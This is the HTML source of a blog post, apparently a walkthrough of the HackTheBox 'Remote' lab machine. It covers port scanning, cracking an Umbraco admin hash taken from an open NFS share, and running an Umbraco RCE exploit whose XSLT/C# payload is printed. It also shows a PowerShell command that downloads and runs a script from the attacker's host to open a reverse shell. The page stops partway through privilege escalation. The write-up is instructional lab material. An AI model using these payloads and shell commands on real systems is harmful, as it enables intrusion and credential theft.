@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GX2L7MWQLN"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GX2L7MWQLN');
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+  <script>
+    window.MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+        fontCache: 'global'
+      }
+    };
+  </script>
+  
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <style>
+          .MathJax {
+  font-size: 180%; /* Adjust the percentage as needed */
+}
+  </style>
+
+  <title>Remote - HackTheBox</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Remote - HackTheBox | Cecil Daemon’s Wish</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Remote - HackTheBox" />
+<meta name="author" content="J. Alex Buschinelli" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:4000/remote-htb" />
+<meta property="og:url" content="http://localhost:4000/remote-htb" />
+<meta property="og:site_name" content="Cecil Daemon’s Wish" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-01-06T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Remote - HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J. Alex Buschinelli","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2024-01-06T00:00:00+00:00","datePublished":"2024-01-06T00:00:00+00:00","description":"Introduction","headline":"Remote - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/remote-htb"},"url":"http://localhost:4000/remote-htb"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <div style="display: flex; justify-content: center; align-items: center; text-decoration: none;">
+      <a href="/" style="display: flex; align-items: center; text-decoration: none;">
+          <img src="/assets/cecil.gif" alt="Cecil Daemon" style="margin-right: 20px;"/>
+          
+          
+          <h1>cecil@celestial:/remote-htb $</h1>
+      
+      </a>
+  </div>
+  <br>
+    </a>
+    <div class="header-links">
+      <a href="/"><h2 class="header-link">Home</h2></a>
+<a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Remote - HackTheBox</h2>
+  <time datetime="2024-01-06T00:00:00+00:00" class="by-line">06 Jan 2024</time>
+  <p>Estimated read time: 16 minutes</p>
+  <h1 id="introduction"><a href="#intro"></a>Introduction</h1>
+
+<p>In this CTF, we are going to be exploiting an Windows system. Through a well done recon, we will be able to find disclosed credentials, get a reverse shell and then escalate our privileges inside the machine. You can access this machine <a href="https://app.hackthebox.com/machines/234">here</a>.</p>
+
+<p>Let’s take a look at it!</p>
+
+<h1 id="challenge-description"><a href="#level-description"></a>Challenge description</h1>
+
+<p>The challenge description is:</p>
+
+<blockquote>
+  <p>Machine Info</p>
+
+  <p>Remote is an easy difficulty Windows machine that features an Umbraco CMS installation. Credentials are found in a world-readable NFS share. Using these, an authenticated Umbraco CMS exploit is leveraged to gain a foothold. A vulnerable TeamViewer version is identified, from which we can gain a password. This password has been reused with the local administrator account. Using <code class="language-plaintext highlighter-rouge">psexec</code> with these credentials returns a SYSTEM shell.</p>
+</blockquote>
+
+<p>The challenge basically gave us all routes to do a good research and thorough recon. We need to find the credentials to log into the Umbraco CMS, where we will have an exploit (probably a CVE) that should give us a shell. From there, we exploit another CVE, but now for TeamViewer, to get the aministrator password. Finally, we get the SYSTEM shell using <code class="language-plaintext highlighter-rouge">psexec</code> from impacket.</p>
+
+<h1 id="approach-mindset"><a href="#approach"></a>Approach mindset</h1>
+
+<p>Let’s separate this into:</p>
+
+<ol>
+  <li>Reconnaissance</li>
+  <li>Getting foothold</li>
+  <li>Escalating privileges</li>
+  <li>Flags</li>
+</ol>
+
+<p>But first, let’s do our own recon as our step 1.</p>
+
+<h2 id="step-1---reconnaissance"><a href="#mindset-step0"></a>Step 1 - Reconnaissance</h2>
+
+<p>The first thing we should do, is run <code class="language-plaintext highlighter-rouge">nmap</code> to see what services and ports are open. We shall start with a simple nmap:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb/ <span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-oN</span> ports.nmap <span class="nt">-A</span> 10.129.229.68
+<span class="c"># Nmap 7.94 scan initiated Sat Jan  6 10:36:32 2024 as: nmap -p- -T4 --min-rate 1000 -oN ports.nmap -A 10.129.229.68</span>
+Nmap scan report <span class="k">for </span>10.129.229.68
+Host is up <span class="o">(</span>0.29s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65519 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Home - Acme Widgets
+111/tcp   open  rpcbind?
+| rpcinfo: 
+|   program version    port/proto  service
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|_  100005  1,2,3       2049/udp6  mountd
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+2049/tcp  open  mountd        1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.94%E<span class="o">=</span>4%D<span class="o">=</span>1/6%OT<span class="o">=</span>21%CT<span class="o">=</span>1%CU<span class="o">=</span>34700%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>65992EB7
+OS:%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>FB%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10E%TI<span class="o">=</span>I%CI<span class="o">=</span>I%II<span class="o">=</span>I%SS<span class="o">=</span>S%TS<span class="o">=</span>U<span class="o">)</span>
+OS:SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>FB%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10E%TI<span class="o">=</span>I%CI<span class="o">=</span>RD%II<span class="o">=</span>I%SS<span class="o">=</span>S%TS<span class="o">=</span>U<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M53ANW8NNS%O2<span class="o">=</span>M
+OS:53ANW8NNS%O3<span class="o">=</span>M53ANW8%O4<span class="o">=</span>M53ANW8NNS%O5<span class="o">=</span>M53ANW8NNS%O6<span class="o">=</span>M53ANNS<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FFFF%
+OS:W2<span class="o">=</span>FFFF%W3<span class="o">=</span>FFFF%W4<span class="o">=</span>FFFF%W5<span class="o">=</span>FFFF%W6<span class="o">=</span>FF70<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>FFFF%O<span class="o">=</span>M53AN
+OS:W8NNS%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>
+OS:0%S<span class="o">=</span>Z%A<span class="o">=</span>S%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>O%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T
+OS:4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>O%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+
+OS:%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>O%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y
+OS:%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>80%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%
+OS:RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>80%CD<span class="o">=</span>Z<span class="o">)</span>
+
+Network Distance: 2 hops
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2024-01-06T13:40:44
+|_  start_date: N/A
+|_clock-skew: 3h01m32s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE <span class="o">(</span>using port 587/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+1   258.93 ms 10.10.16.1
+2   128.65 ms 10.129.229.68
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sat Jan  6 10:43:03 2024 -- 1 IP address (1 host up) scanned in 390.87 seconds</span>
+</code></pre></div></div>
+
+<p>From this, we can see some interesting information. Let’s address each one of them.</p>
+
+<h3 id="port-21">Port 21</h3>
+
+<p>Nmap showed us that FTP port 21 is open and anonymous login is enabled. Let’s take a look at it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial ~/CTFs/htb/machines/Remote <span class="nv">$ </span>ftp 10.129.229.68
+Connected to 10.129.229.68.
+220 Microsoft FTP Service
+Name <span class="o">(</span>10.129.229.68:kaizen<span class="o">)</span>: anonymous
+331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password: 
+230 User logged <span class="k">in</span><span class="nb">.</span>
+Remote system <span class="nb">type </span>is Windows_NT.
+ftp&gt; <span class="nb">ls
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+226 Transfer complete.
+ftp&gt; <span class="nb">pwd
+</span>257 <span class="s2">"/"</span> is current directory.
+</code></pre></div></div>
+
+<p>As we can see, there is nothing in the FTP filesystem.</p>
+
+<h3 id="port-80">Port 80</h3>
+
+<p>On port 80, we have the web service.</p>
+
+<p><img src="../figs/remote-htb1.png" alt="Remote webservice homepage" /></p>
+
+<p>Upon some clicks here and there, we end up at the login page:</p>
+
+<p><img src="../figs/remote-htb2.png" alt="login page" /></p>
+
+<p>From the machine description, we need to login into Umbraco CMS in order to exploit the vulnerability, so we are stuck here. Let’s move to the next interesting ports.</p>
+
+<h3 id="ports-139-445">Ports 139, 445</h3>
+
+<p>These are related to SMB. I tried to enumerate these manually, but with not success. It seems it is for authenticated users only. Let’s move to the NFS port.</p>
+
+<h3 id="port-2049">Port 2049</h3>
+
+<p>According to the machine description, the credentials to the Umbraco CMS lie somewhere in the NFS share. Let’s use <code class="language-plaintext highlighter-rouge">showmount</code> to list available public shares:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>.pyvenv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span>showmount <span class="nt">-e</span> 10.129.229.68
+Export list <span class="k">for </span>10.129.229.68:
+/site_backups <span class="o">(</span>everyone<span class="o">)</span>
+</code></pre></div></div>
+
+<p>So we are able to connect to <code class="language-plaintext highlighter-rouge">/site_backups</code> share. From its name, it seems to be the backup files that makes the website up running. To connect, we need to create a mount point first with <code class="language-plaintext highlighter-rouge">mkdir -p /tmp/mnt</code> for example. Using <a href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting">HackTricks</a>, we find the command to connect to the NFS share:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>.pyvenv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span><span class="nb">sudo </span>mount <span class="nt">-t</span> nfs <span class="nt">-o</span> <span class="nv">vers</span><span class="o">=</span>3,nolock <span class="nv">$IP</span>:/site_backups /tmp/mnt/
+<span class="o">(</span>.pyvenv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span><span class="nb">cd</span> /tmp/mnt
+<span class="o">(</span>.pyvenv<span class="o">)</span> kaizen@celestial /tmp/mnt <span class="nv">$ </span><span class="nb">ls
+</span>App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
+App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views
+</code></pre></div></div>
+
+<p>Upon a quick research of where Umbraco stores passwords, we find <a href="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials">this</a> stackoverflow post. We see that it is inside <code class="language-plaintext highlighter-rouge">App_Data/Umbraco.sdf</code> file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>.pyvenv<span class="o">)</span> kaizen@celestial /tmp/mnt <span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-name</span> Umbraco.sdf <span class="nt">-type</span> f
+./App_Data/Umbraco.sdf
+</code></pre></div></div>
+<p>If we try to cat it, we will see that it seems like a binary file: unreadable. Let’s try to grep for <code class="language-plaintext highlighter-rouge">password</code>, <code class="language-plaintext highlighter-rouge">passwordhash</code> and <code class="language-plaintext highlighter-rouge">hash</code>. The last search yields:</p>
+
+<p><img src="../figs/remote-htb3.png" alt="password-hash" /></p>
+
+<p>Showing the password hash is <code class="language-plaintext highlighter-rouge">b8be16afba8c314ad33d812f22a04991b90e2aaa</code> and uses SHA1 hash. We can also see that the admin’s email is <code class="language-plaintext highlighter-rouge">admin@htb.local</code>.</p>
+
+<p>We can use John The Ripper to crack this hash:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>.pyvenv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span>john <span class="nt">--format</span>:RAW-SHA1 <span class="nt">--wordlist</span>:/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-SHA1 <span class="o">[</span>SHA1 128/128 AVX 4x]<span class="o">)</span>
+No password hashes left to crack <span class="o">(</span>see FAQ<span class="o">)</span>
+<span class="o">(</span>.pyvenv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span>john <span class="nt">--show</span> hash.txt 
+?:baconandcheese
+
+1 password <span class="nb">hash </span>cracked, 0 left
+</code></pre></div></div>
+
+<h3 id="back-to-website">Back to website…</h3>
+
+<p>Now that we have the credentials <code class="language-plaintext highlighter-rouge">admin@htb.local:baconandcheese</code>, let’s try and log in:</p>
+
+<p><img src="../figs/remote-htb4.png" alt="logged in webpage" /></p>
+
+<p>And we are in the website! Note that the Umbraco version used is 7.12.4.  Now, it’s time to find an exploit for this online. A quick Google search <code class="language-plaintext highlighter-rouge">umbraco 7.12.4 exploit</code> leads to <a href="https://www.exploit-db.com/exploits/49488">this</a> exploit. From the code, it seems to making a POST request to the <code class="language-plaintext highlighter-rouge">/umbraco/backoffice/UmbracoApi/Authentication/PostLogin</code> endpoint with this payload:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="sh">"""</span><span class="se">\
+</span><span class="s">&lt;?xml version=</span><span class="sh">"</span><span class="s">1.0</span><span class="sh">"</span><span class="s">?&gt;&lt;xsl:stylesheet version=</span><span class="sh">"</span><span class="s">1.0</span><span class="sh">"</span><span class="s"> xmlns:xsl=</span><span class="sh">"</span><span class="s">http://www.w3.org/1999/XSL/Transform</span><span class="sh">"</span><span class="s"> xmlns:msxsl=</span><span class="sh">"</span><span class="s">urn:schemas-microsoft-com:xslt</span><span class="sh">"</span><span class="s"> xmlns:csharp_user=</span><span class="sh">"</span><span class="s">http://csharp.mycompany.com/mynamespace</span><span class="sh">"</span><span class="s">&gt;&lt;msxsl:script language=</span><span class="sh">"</span><span class="s">C#</span><span class="sh">"</span><span class="s"> implements-prefix=</span><span class="sh">"</span><span class="s">csharp_user</span><span class="sh">"</span><span class="s">&gt;public string xml() { string cmd = </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s">; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s">; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  &lt;/msxsl:script&gt;&lt;xsl:template match=</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="s">&gt; &lt;xsl:value-of select=</span><span class="sh">"</span><span class="s">csharp_user:xml()</span><span class="sh">"</span><span class="s">/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;</span><span class="se">\
+</span><span class="sh">"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">arguments</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">command</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>From what I understood, this payload appears to be an XML file that uses XSLT with embedded C# code. XSLT is a language used for transforming XML documents into other formats. The payload is structured to not only perform a transformation but also execute C# code within the context of an XSLT processor that supports the msxsl:script extension.</p>
+
+<p>The embedded C# code here is used to run arbitrary code passed by the <code class="language-plaintext highlighter-rouge">-c</code> and <code class="language-plaintext highlighter-rouge">-a</code> switches. The exploit has a line that says:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#usage python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig
+</span></code></pre></div></div>
+
+<p>Let’s test it out!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>.pyvenv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span>python exploit.py <span class="nt">-u</span> admin@htb.local <span class="nt">-p</span> baconandcheese <span class="nt">-i</span> http://10.129.14.142 <span class="nt">-c</span> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : .htb
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::8a
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::d5a:847:7d7c:ae55
+   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::d5a:847:7d7c:ae55%12
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.129.14.142
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.0.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::250:56ff:feb9:2bb5%12
+                                       10.129.0.1
+</code></pre></div></div>
+
+<p>Amazing! We are able to execute arbitrary code server-side. Now, we must think of a way to spawn a reverse shell.</p>
+
+<h2 id="step-2---getting-foothold"><a href="#mindset-step2"></a>Step 2 - Getting foothold</h2>
+
+<p>Upon a long search, I ended up with this powershell script from <a href="https://github.com/samratashok/nishang#anti-virus">Nishang</a>. As we can see, we can spawn a reverse shell if WIndows runs the following command:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1'</span><span class="p">);</span><span class="nx">Invoke-PowerShellTcp</span><span class="w"> </span><span class="nt">-Reverse</span><span class="w"> </span><span class="nt">-IPAddress</span><span class="w"> </span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="p">[</span><span class="n">PortNo.</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>So, one way we could try to access the reverse shell is by running the exploit as this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py <span class="nt">-u</span> admin@htb.local <span class="nt">-p</span> baconandcheese <span class="nt">-i</span> <span class="s1">'http://10.129.14.142'</span> <span class="nt">-c</span> <span class="s1">'cmd.exe'</span> <span class="nt">-a</span> <span class="s2">"/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.14/Invoke-PowerShellTcp.ps1');;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.14 -Port 4444"</span>
+</code></pre></div></div>
+<p>For that to work, we need to run a Python server where our <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code> script is, and also run <code class="language-plaintext highlighter-rouge">nc -lnvp 4444</code> to receive the shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>root: 
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<p>then, in another tab:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4444
+</code></pre></div></div>
+
+<p>and finally, we run the exploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>.pyvenv<span class="o">)</span> kaizen@celestial /tmp/htb <span class="nv">$ </span>python exploit.py <span class="nt">-u</span> admin@htb.local <span class="nt">-p</span> baconandcheese <span class="nt">-i</span> <span class="s1">'http://10.129.14.142'</span> <span class="nt">-c</span> <span class="s1">'cmd.exe'</span> <span class="nt">-a</span> <span class="s2">"/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.14/Invoke-PowerShellTcp.ps1');;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.14 -Port 4444"</span>
+</code></pre></div></div>
+
+<p>In our netcat, we got a connection:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4444
+Connection from 10.129.14.142:49693
+Windows PowerShell running as user REMOTE<span class="nv">$ </span>on REMOTE
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
+iis apppool<span class="se">\d</span>efaultapppool
+</code></pre></div></div>
+
+<p>As we can see, we are not root, but we have access to the system. Let’s now think of a way of escalate privileges.</p>
+
+<h2 id="step-3---escalating-privileges"><a href="#mindset-step3"></a>Step 3 - Escalating privileges</h2>
+
+<p>We first need to know where TeamViewer is running. For that, we can run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; tasklist /svc
+<span class="o">[</span>...snip...]
+svchost.exe                   2200 W3SVC, WAS                                  
+vmtoolsd.exe                  2208 VMTools                                     
+TeamViewer_Service.exe        2216 TeamViewer7                                 
+svchost.exe                   2236 W32Time                                     
+MsMpEng.exe                   2244 WinDefend     
+<span class="o">[</span>...snip...]
+</code></pre></div></div>
+
+<p>Now, we take a look on CVEs regarding TeamViewer7. After searching through lots of different CVEs, it seems that it is <a href="https://www.cvedetails.com/cve/CVE-2019-18988/">this</a> one. Summarizing it, we have:</p>
+
+<blockquote>
+  <p>TeamViewer Desktop through 14.7.1965 allows a bypass of remote-login access control because the same key is used for different customers’ installations. It used a shared AES key for all installations since at least as far back as v7.0.43148, and used it for at least OptionsPasswordAES in the current version of the product. If an attacker were to know this key, they could decrypt protect information stored in the registry or configuration files of TeamViewer. With versions before v9.x , this allowed for attackers to decrypt the Unattended Access password to the system (which allows for remote login to the system as well as headless file browsing). The latest version still uses the same key for OptionPasswordAES but appears to have changed how the Unattended Access password is stored. While in most cases an attacker requires an existing session on a system, if the registry/configuration keys were stored off of the machine (such as in a file share or online), an attacker could then decrypt the required password to login to the system.</p>
+</blockquote>
+
